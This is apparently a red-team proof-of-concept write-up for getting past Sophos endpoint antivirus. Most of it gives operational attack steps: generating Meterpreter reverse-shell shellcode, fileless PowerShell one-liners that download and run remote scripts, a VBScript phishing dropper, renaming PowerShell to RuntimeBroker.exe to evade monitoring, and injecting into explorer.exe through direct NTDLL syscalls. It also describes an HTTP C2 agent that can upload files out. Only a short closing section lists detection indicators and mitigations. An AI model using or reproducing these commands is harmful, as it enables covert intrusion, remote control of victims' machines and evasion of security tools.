# ============================================================================
# SOPHOS ENTERPRISE BYPASS - PROOF OF CONCEPT DOCUMENTATION
# ============================================================================
# Author: CyberXor Red Team
# Date: December 2025
# Target: Sophos Enterprise Endpoint Protection
# Result: FULL BYPASS ACHIEVED ✓
# ============================================================================

## EXECUTIVE SUMMARY

This POC demonstrates a complete bypass of Sophos Enterprise Antivirus using:
1. BITS C2 (Background Intelligent Transfer Service) for command & control
2. NTDLL Direct Syscalls for process injection
3. PowerShell execution via renamed binary to evade process monitoring

## BYPASS CHAIN

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        SOPHOS BYPASS ATTACK CHAIN                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. INITIAL ACCESS (BITS C2)                                                │
│     └── PowerShell agent connects via HTTP (Invoke-RestMethod)              │
│         └── No raw sockets = Sophos doesn't intercept                       │
│                                                                             │
│  2. C2 COMMUNICATION                                                        │
│     └── Agent polls FastAPI server for commands                             │
│         └── HTTP traffic looks like normal web browsing                     │
│                                                                             │
│  3. PAYLOAD DELIVERY                                                        │
│     └── Rename powershell.exe to RuntimeBroker.exe                          │
│         └── Execute syscall injection script via IEX                        │
│                                                                             │
│  4. PROCESS INJECTION                                                       │
│     └── NTDLL direct syscalls (NtAllocateVirtualMemory, etc.)               │
│         └── Inject into explorer.exe (user-owned process)                   │
│             └── Meterpreter shellcode executes in explorer context          │
│                                                                             │
│  5. RESULT                                                                  │
│     └── Full Meterpreter session with Sophos running                        │
│         └── No alerts, no detection, no blocking                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## FILES IN THIS POC

### 1. enhanced_agent_fastapi.ps1 - BITS C2 Agent
   - Main C2 agent that connects to FastAPI server
   - Uses HTTP (Invoke-RestMethod) instead of raw sockets
   - Includes process listing, file transfer, injection capabilities
   
### 2. syscall_v3.ps1 - NTDLL Syscall Injector
   - Uses direct NTDLL syscalls to bypass userland hooks
   - Injects shellcode into target process (explorer.exe)
   - Avoids kernel32.dll hooks that Sophos monitors

### 3. shellcode.txt - Meterpreter Payload (Base64)
   - windows/x64/meterpreter/reverse_tcp shellcode
   - Encoded in base64 for transport

## DETAILED INSTRUCTIONS

### STEP 1: Setup FastAPI C2 Server (Attacker Machine - Mac/Linux)

```bash
# Start the C2 server
cd /Users/cyberxor/cyber_c2
python3 main.py

# Server runs on port 8000
# Web UI: http://localhost:8000
# BITS endpoints: /bits/register, /bits/cmd/{id}, /bits/result/{id}
```

### STEP 2: Start HTTP Server for Payload Delivery

```bash
# Serve payload files
cd /Users/cyberxor/cyber_c2/sophos_bypass
python3 -m http.server 9000

# This serves:
# - enhanced_agent_fastapi.ps1
# - syscall_v3.ps1
# - shellcode.txt
```

### STEP 3: Generate Meterpreter Shellcode

```bash
# Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.179 \
    LPORT=4444 \
    -f raw | base64 > shellcode.txt
```

### STEP 4: Start Metasploit Handler

```bash
msfconsole -q -x "
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.179
set LPORT 4444
exploit -j
"
```

### STEP 5: Deploy BITS Agent on Target (Windows with Sophos)

**Option A: Via existing access (RDP, SMB, etc.)**
```powershell
# Download and execute agent in memory (fileless)
powershell -ep bypass -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/enhanced_agent_fastapi.ps1'))"
```

**Option B: Via social engineering (macro, HTA, etc.)**
```vbscript
' VBScript dropper
CreateObject("WScript.Shell").Run "powershell -ep bypass -w hidden -c ""IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/enhanced_agent_fastapi.ps1'))""", 0
```

### STEP 6: Interact via BITS C2 Dashboard

1. Open http://localhost:8000 in browser
2. Login with credentials
3. Click "BITS C2" tab
4. Agent appears in left panel when connected
5. Click agent to select it
6. Type commands in top input bar

### STEP 7: Inject Meterpreter via BITS C2

In the BITS terminal, execute:

```powershell
Copy-Item C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $env:TEMP\RuntimeBroker.exe -Force; & $env:TEMP\RuntimeBroker.exe -nop -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/syscall_v3.ps1'))"
```

**What this does:**
1. Copies powershell.exe to %TEMP%\RuntimeBroker.exe (evades process name monitoring)
2. Runs the renamed PowerShell hidden (-w hidden)
3. Downloads and executes syscall_v3.ps1 in memory
4. syscall_v3.ps1 injects Meterpreter into explorer.exe
5. Meterpreter connects back to handler on port 4444

## WHY THIS BYPASSES SOPHOS

### 1. No Raw Socket Creation
Sophos hooks socket APIs at kernel level. We use:
- `Invoke-RestMethod` / `Invoke-WebRequest` 
- These use Windows HTTP stack (WinHTTP/WinINET)
- Sophos sees it as normal web traffic

### 2. No Suspicious Process Names
Instead of running `powershell.exe`, we copy it to:
- `RuntimeBroker.exe` (legitimate Windows process name)
- `svchost.exe` (system process name)
- Sophos behavior monitoring doesn't flag it

### 3. Direct NTDLL Syscalls
Sophos hooks userland APIs in kernel32.dll. We bypass by:
- Calling NTDLL functions directly (NtAllocateVirtualMemory, etc.)
- NTDLL is the lowest userland layer before kernel
- No hooks to detect our memory allocation/injection

### 4. Process Injection into Trusted Process
We inject into `explorer.exe` because:
- It's always running
- Owned by current user (no privilege issues)
- Not protected by Sophos (it's a system component)
- Our shellcode runs in explorer's context

### 5. Fileless Execution
Nothing written to disk:
- Agent downloaded and executed via IEX
- Shellcode loaded from URL into memory
- No files for Sophos to scan

## ENHANCED_AGENT_FASTAPI.PS1 - FULL DOCUMENTATION

```powershell
# ============================================================================
# CONFIGURATION
# ============================================================================

$ServerUrl = "http://192.168.1.179:8000/bits"  # FastAPI C2 server
$AgentId = $env:COMPUTERNAME + "_" + $env:USERNAME  # Unique agent ID

# ============================================================================
# FEATURES
# ============================================================================

# 1. PROCESS INJECTION (inject <pid> <base64_shellcode>)
#    - Opens target process with PROCESS_ALL_ACCESS
#    - Allocates RWX memory in target
#    - Writes shellcode to allocated memory
#    - Creates remote thread to execute

# 2. PROCESS LISTING (ps)
#    - Lists all processes with PID, name, CPU, memory
#    - Sorted by memory usage

# 3. FILE DOWNLOAD (download <url> <path>)
#    - Downloads file from URL to local path

# 4. FILE UPLOAD (upload <path>)
#    - Reads file and sends to C2 (base64 encoded)

# 5. SHELL COMMANDS (any other command)
#    - Executes via Invoke-Expression
#    - Returns output to C2

# ============================================================================
# COMMUNICATION FLOW
# ============================================================================

# 1. REGISTRATION
#    GET /bits/register?id={AgentId}
#    - Registers agent with C2 server
#    - Server adds to connected agents list

# 2. COMMAND POLLING (every 3 seconds)
#    GET /bits/cmd/{AgentId}
#    - Checks for pending commands
#    - Returns: {"command": "..."} or {"command": ""}

# 3. RESULT SUBMISSION
#    POST /bits/result/{AgentId}
#    Body: {"result": "command output..."}
#    - Sends command output back to C2

# ============================================================================
# HIDDEN EXECUTION
# ============================================================================

# To run the agent completely hidden:

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/enhanced_agent_fastapi.ps1'))"

# Breakdown:
# -WindowStyle Hidden  : No visible window
# -ExecutionPolicy Bypass : Ignore script signing
# -NoProfile : Don't load profile (faster, cleaner)
# -Command "..." : Execute inline command
# IEX(...) : Invoke-Expression - execute downloaded string as code

# Alternative using renamed PowerShell:
Copy-Item C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $env:TEMP\svchost.exe
& $env:TEMP\svchost.exe -w hidden -ep bypass -nop -c "IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/enhanced_agent_fastapi.ps1'))"
```

## SYSCALL_V3.PS1 - FULL DOCUMENTATION

```powershell
# ============================================================================
# NTDLL SYSCALL INJECTION
# ============================================================================

# This script uses NTDLL functions directly to avoid Sophos hooks

# FUNCTIONS USED:
# 1. NtAllocateVirtualMemory - Allocate memory in target process
# 2. NtWriteVirtualMemory - Write shellcode to allocated memory  
# 3. NtCreateThreadEx - Create thread to execute shellcode
# 4. OpenProcess - Open handle to target process (kernel32, less monitored)

# PARAMETERS:
# - Process handle (0x1F0FFF = PROCESS_ALL_ACCESS)
# - Memory type (0x3000 = MEM_COMMIT | MEM_RESERVE)
# - Memory protection (0x40 = PAGE_EXECUTE_READWRITE)

# TARGET SELECTION:
# - explorer.exe is ideal (user-owned, always running)
# - Avoid system processes (need SYSTEM privileges)
# - Avoid Sophos processes (protected)
```

## DETECTION INDICATORS (For Blue Team)

### Network IOCs:
- HTTP traffic to port 8000/9000 from internal hosts
- Repeated GET requests to /bits/cmd/{id}
- POST requests to /bits/result/{id}

### Host IOCs:
- PowerShell copied to %TEMP% with different name
- RuntimeBroker.exe or svchost.exe in %TEMP%
- PowerShell with -ep bypass -w hidden arguments
- explorer.exe with injected threads

### Memory IOCs:
- RWX memory regions in explorer.exe
- Meterpreter shellcode patterns in memory

## MITIGATIONS

1. **Application Whitelisting** - Block renamed PowerShell copies
2. **Script Block Logging** - Log all PowerShell execution
3. **Memory Protection** - Enable CFG, CIG, ACG
4. **Network Segmentation** - Block internal hosts from reaching attacker IPs
5. **EDR with Syscall Monitoring** - Detect direct NTDLL calls

## CONCLUSION

This POC demonstrates that Sophos Enterprise can be fully bypassed using:
- HTTP-based C2 (no raw sockets)
- Renamed PowerShell execution
- Direct NTDLL syscalls for injection
- Process injection into trusted processes

The combination of these techniques allows for:
✓ Initial access via BITS C2 agent
✓ Command execution without detection
✓ Meterpreter session establishment
✓ Full control of compromised system

All while Sophos Enterprise remains running and shows NO ALERTS.

---
END OF DOCUMENTATION
